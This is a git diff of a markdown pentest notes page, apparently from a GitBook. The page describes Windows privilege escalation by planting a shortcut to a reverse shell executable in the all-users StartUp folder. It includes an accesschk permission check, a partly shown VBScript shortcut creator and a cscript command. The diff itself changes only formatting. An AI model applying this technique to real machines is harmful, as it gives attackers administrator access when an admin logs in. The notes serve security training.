@@ -2,17 +2,17 @@
 
 Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users:
 
-```text
+```
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 ```
 
 If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
 
 {% hint style="info" %}
-Note that shortcut files \(.lnk\) must be used. The following VBScript can be used:
+Note that shortcut files (.lnk) must be used. The following VBScript can be used:
 {% endhint %}
 
-```text
+```
 to create a shortcut file:
 Set oWS = WScript.CreateObject("WScript.Shell")
 sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
@@ -23,31 +23,30 @@ oLink.Target
 
 #### reverse.lnk is our reverse shell executable.
 
-![](../../../.gitbook/assets/image%20%28158%29.png)
+![](<../../../.gitbook/assets/image (158).png>)
 
 Use accesschk.exe to check permissions on the StartUp directory:
 
-```text
+```
 \accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-![](../../../.gitbook/assets/image%20%28157%29.png)
+![](<../../../.gitbook/assets/image (157).png>)
 
 Note that the BUILTIN\Users group has write access to this directory.
 
 Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
 
-![](../../../.gitbook/assets/image%20%28161%29.png)
+![](<../../../.gitbook/assets/image (161).png>)
 
 Run the script using cscript:
 
-```text
+```
 cscript CreateShortcut.vbs
 ```
 
-![](../../../.gitbook/assets/image%20%28162%29.png)
+![](<../../../.gitbook/assets/image (162).png>)
 
 no we wait for the admin to login:
 
-![](../../../.gitbook/assets/image%20%28156%29.png)
-
+![](<../../../.gitbook/assets/image (156).png>)
